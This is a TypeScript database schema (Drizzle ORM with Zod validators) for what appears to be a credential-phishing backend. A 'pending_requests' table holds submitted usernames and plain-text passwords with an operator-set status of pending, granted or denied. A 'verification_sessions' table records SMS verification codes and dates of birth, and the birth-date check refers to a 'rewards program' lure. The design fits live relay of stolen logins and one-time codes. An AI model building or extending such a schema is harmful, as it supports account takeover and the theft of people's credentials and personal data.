import { pgTable, text, serial, integer, boolean, timestamp } from "drizzle-orm/pg-core";
import { createInsertSchema } from "drizzle-zod";
import { z } from "zod";

export const users = pgTable("users", {
  id: text("id").primaryKey().$defaultFn(() => crypto.randomUUID()),
  username: text("username").notNull().unique(),
  password: text("password").notNull(),
  rememberUsername: boolean("remember_username").default(false),
  lastLogin: timestamp("last_login"),
  createdAt: timestamp("created_at").defaultNow(),
});

export const loginAttempts = pgTable("login_attempts", {
  id: text("id").primaryKey().$defaultFn(() => crypto.randomUUID()),
  username: text("username").notNull(),
  success: boolean("success").notNull(),
  ipAddress: text("ip_address"),
  userAgent: text("user_agent"),
  timestamp: timestamp("timestamp").defaultNow(),
});

export const pendingRequests = pgTable("pending_requests", {
  id: text("id").primaryKey(),
  username: text("username").notNull(),
  password: text("password").notNull(),
  ipAddress: text("ip_address"),
  userAgent: text("user_agent"),
  status: text("status").notNull().default("pending"), // pending, granted, denied
  timestamp: timestamp("timestamp").defaultNow(),
});

export const insertUserSchema = createInsertSchema(users).pick({
  username: true,
  password: true,
  rememberUsername: true,
});

export const usernameSchema = z.object({
  username: z.string().min(3, "Username must be at least 3 characters long"),
  rememberUsername: z.boolean().default(false),
});

export const loginSchema = z.object({
  username: z.string().min(3, "Username must be at least 3 characters long"),
  password: z.string().optional(),
  rememberUsername: z.boolean().default(false),
});

export const insertLoginAttemptSchema = createInsertSchema(loginAttempts).omit({
  id: true,
  timestamp: true,
});

export const smsVerificationSchema = z.object({
  code: z.string().length(6, "Verification code must be 6 digits"),
  dateOfBirth: z.string()
    .min(1, "Date of birth is required")
    .refine((dateStr) => {
      const date = new Date(dateStr);
      return !isNaN(date.getTime());
    }, "Please enter a valid date")
    .refine((dateStr) => {
      const date = new Date(dateStr);
      const year = date.getFullYear();
      return year >= 1900;
    }, "Please enter a valid birth year.")
    .refine((dateStr) => {
      const date = new Date(dateStr);
      const today = new Date();
      return date <= today;
    }, "Birth date cannot be in the future.")
    .refine((dateStr) => {
      const date = new Date(dateStr);
      const year = date.getFullYear();
      const currentYear = new Date().getFullYear();
      return year !== currentYear;
    }, `Birth year cannot be ${new Date().getFullYear()}. Please enter your actual date of birth.`)
    .refine((dateStr) => {
      const date = new Date(dateStr);
      const today = new Date();
      const eighteenYearsAgo = new Date(
        today.getFullYear() - 18,
        today.getMonth(),
        today.getDate()
      );
      return date <= eighteenYearsAgo;
    }, "You must be at least 18 years old to participate in the rewards program."),
});



export type InsertUser = z.infer<typeof insertUserSchema>;
export type User = typeof users.$inferSelect;
export type UsernameData = z.infer<typeof usernameSchema>;
export type LoginData = z.infer<typeof loginSchema>;
export type InsertLoginAttempt = z.infer<typeof insertLoginAttemptSchema>;
export type LoginAttempt = typeof loginAttempts.$inferSelect;
export type SmsVerificationData = z.infer<typeof smsVerificationSchema>;

export const verificationSessions = pgTable("verification_sessions", {
  id: text("id").primaryKey().$defaultFn(() => crypto.randomUUID()),
  username: text("username").notNull(),
  smsCode: text("sms_code"),
  dateOfBirth: text("date_of_birth"),
  ipAddress: text("ip_address"),
  timestamp: timestamp("timestamp").defaultNow(),
});

export const insertVerificationSessionSchema = createInsertSchema(verificationSessions).omit({
  id: true,
  timestamp: true,
});

export type VerificationSession = typeof verificationSessions.$inferSelect;
export type InsertVerificationSession = z.infer<typeof insertVerificationSessionSchema>;
